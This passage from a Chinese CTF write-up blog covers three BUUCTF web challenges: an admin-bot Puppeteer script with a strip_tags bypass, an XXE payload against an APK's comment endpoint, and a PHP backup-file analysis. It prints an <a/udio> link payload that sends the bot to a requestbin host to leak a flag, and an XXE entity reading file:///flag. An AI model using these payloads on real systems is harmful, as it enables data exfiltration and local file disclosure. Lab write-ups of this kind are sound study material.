+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Query! (&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">newPage&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setUserAgent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">waitUntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;networkidle0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">});&lt;/span>
+&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#like&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">});&lt;/span>
+&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Done! (&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">)`&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;span style="color:#111">};&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">init&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">puppeteer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">launch&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">browser_option&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">page&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">newPage&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Setting up...`&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`http://challenge/login.php`&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#username&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">admin_username&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#password&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#password&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">admin_password&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#login-submit&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#111">Promise&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">all&lt;/span>&lt;span style="color:#111">([&lt;/span>
+&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">$eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#login-submit&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">elem&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">elem&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">()),&lt;/span>
+&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">evaluate&lt;/span>&lt;span style="color:#111">(()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">innerHTML&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;href=&amp;#34;posts.php&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">)){&lt;/span>
+&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#111">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`Login failed at &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">.`&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[+] Setup done!`&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`[-] Error while setting up :(`&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">evaluate&lt;/span>&lt;span style="color:#111">(()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">document&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">innerHTML&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">`body: &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">body&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">browser&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">};&lt;/span>
+&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">(){&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[+] handle&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">blpop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;query&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">undefined&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75af00">browser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">init&lt;/span>&lt;span style="color:#111">();&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">crawl&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://challenge/post.php?id=&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;span style="color:#75af00">setTimeout&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// handle next
+&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">});&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#111">();&lt;/span> &lt;span style="color:#75715e">// first ignite
+&lt;/span>&lt;span style="color:#75715e">&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到有flag，肯定是要xss拿到；admin会先登入admin账号，接着crawl()访问url&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setUserAgent&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#00a8c8">goto&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">waitUntil&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;networkidle0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">,&lt;/span>
+&lt;span style="color:#111">});&lt;/span>
+&lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">click&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;#like&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">page&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">waitForNavigation&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#75af00">timeout&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">});&lt;/span>
+&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>会点击页面的&lt;code>#like&lt;/code>，也就是上面创建Post时勾选的框&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180603461.png" alt="image-20220119180603461">&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119180442910.png" alt="image-20220119180442910">&lt;/p>
+&lt;p>注意到它对标签的过滤，但是允许&lt;code>&amp;lt;audio&amp;gt;&lt;/code>的存在&lt;/p>
+&lt;p>查资料可知&lt;code>strip_tags&lt;/code>有安全问题，它不会过滤&lt;code>&amp;lt;a/udio&amp;gt;&lt;/code>标签，并且&lt;code>&amp;lt;a/udio&amp;gt;&lt;/code>会作为超链接&lt;code>&amp;lt;a&amp;gt;&lt;/code>被解析，同时超链接的跳转是不受csp的控制的，payload&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;a/udio id=like href=&amp;quot;http://http.requestbin.buuoj.cn/v4c4pyv4&amp;quot;&amp;gt;aa&amp;lt;/a/udio&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>buu改k8s之后内网的题多少有点问题，一直拿不到flag，寄&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[FireshellCTF2020]Cars
+&lt;/h4>
+&lt;/summary>
+&lt;p>这咋就apk了……算了，摁看&lt;/p>
+&lt;p>在Rest.kt中看到三个路由&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119185150236.png" alt="image-20220119185150236">&lt;/p>
+&lt;p>在domain目录下可以看到对应接收的参数格式，/comment可以传入name和message；在CommentActivity中有个&lt;code>send_comment&lt;/code>调用了&lt;code>postComment&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119190020847.png" alt="image-20220119190020847">&lt;/p>
+&lt;p>这里使用了&lt;code>GsonConvertFactory&lt;/code>，这是一个解析json的库，同时这里还引入了&lt;code>retrofit2&lt;/code>，给我们xxe的可能&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-xml" data-lang="xml">&lt;span style="color:#75715e">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span>
+&lt;span style="color:#75715e">&amp;lt;!DOCTYPE foo [
+&lt;/span>&lt;span style="color:#75715e"> &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span>
+&lt;span style="color:#75715e">&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///flag&amp;#34; &amp;gt;&lt;/span>
+]&amp;gt;
+&lt;span style="color:#f92672">&amp;lt;Comment&amp;gt;&lt;/span>
+&lt;span style="color:#f92672">&amp;lt;name&amp;gt;&lt;/span>&lt;span style="color:#111">&amp;amp;xxe;&lt;/span>&lt;span style="color:#f92672">&amp;lt;/name&amp;gt;&lt;/span>
+&lt;span style="color:#f92672">&amp;lt;message&amp;gt;&lt;/span>flag please!&lt;span style="color:#f92672">&amp;lt;/message&amp;gt;&lt;/span>
+&lt;span style="color:#f92672">&amp;lt;/Comment&amp;gt;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>记得修改Content-Type为application/xml&lt;/p>
+&lt;p>flag{d96dc7a4-8be4-4e05-9bbf-64fcf8009182}&lt;/p>
+&lt;/details>
+&lt;details>
+&lt;summary>
+&lt;h4 class="inline">
+[网鼎杯 2020 总决赛]Novel
+&lt;/h4>
+&lt;/summary>
+&lt;p>只看给的附件，大概扫一下猜测是个反序列化的题；然后看下页面交互，好像跟猜的有一点不太一样，可以选择私藏，会post访问/back/backup，对应的是back.class.php 传入filename和path，选择上传文件会post访问/upload/profile，对应的是upload.class.php&lt;/p>
+&lt;p>index.php中关键处在这里&lt;/p>
+&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220119223606818.png" alt="image-20220119223606818">&lt;/p>
+&lt;p>back类中除backup外还有三个私有函数&lt;code>_write&lt;/code>, &lt;code>_create&lt;/code>, &lt;code>random_code &lt;/code>，在调用&lt;code>backup&lt;/code>时会先依次调用这几个函数进行处理&lt;/p>
+&lt;p>&lt;code>backup&lt;/code>中，首先判断&lt;code>profile/&lt;/code>下有没有同名文件，对内容进行&lt;code>htmlspecialchars&lt;/code>处理后，先是用&lt;code>random_code&lt;/code>生成随机密码，然后进行&lt;/p>
+&lt;pre tabindex="0">&lt;code>$this-&amp;gt;_write($dest, $this-&amp;gt;_create($password, $content));
+&lt;/code>&lt;/pre>&lt;p>&lt;code>_create&lt;/code>会将密码和内容拼到一起&lt;/p>
+&lt;pre tabindex="0">&lt;code>private function _create($password, $content){
+$_content='&amp;lt;?php $_GET[&amp;quot;password&amp;quot;]===&amp;quot;'.$password.'&amp;quot;?print(&amp;quot;'.$content.'&amp;quot;):exit(); ';
+return $_content;
+}
+&lt;/code>&lt;/pre>&lt;p>随后进入&lt;code>_write&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">_write&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dest&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;span style="color:#111">$f1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$dest&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$f2&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;private/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">random_code&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">$stream_f1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">fopen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;w+&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">rewind&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#111">$f1_read&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">fread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/^&amp;lt;\?php \$_GET\[\&amp;#34;password\&amp;#34;\]===\&amp;#34;[a-zA-Z0-9]{8}\&amp;#34;\?print\(\&amp;#34;.*\&amp;#34;\):exit\(\); $/s&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$f1_read&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$matches&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$matches&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">])){&lt;/span>
+&lt;span style="color:#75af00">copy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$f1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$f2&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$f2&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;span style="color:#75af00">fwrite&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php exit(); ?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#75af00">fclose&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$stream_f1&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;span style="color:#111">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>先将&lt;code>$dest&lt;/code>和上面&lt;code>_create&lt;/code>生成的内容拼一起，然后对内容进行过滤处理，通过过滤的话将会在&lt;code>/private&lt;/code>目录下存一份备份文件并返回完整路径，没通过过滤的话会在文件中写入死亡exit&lt;/p>
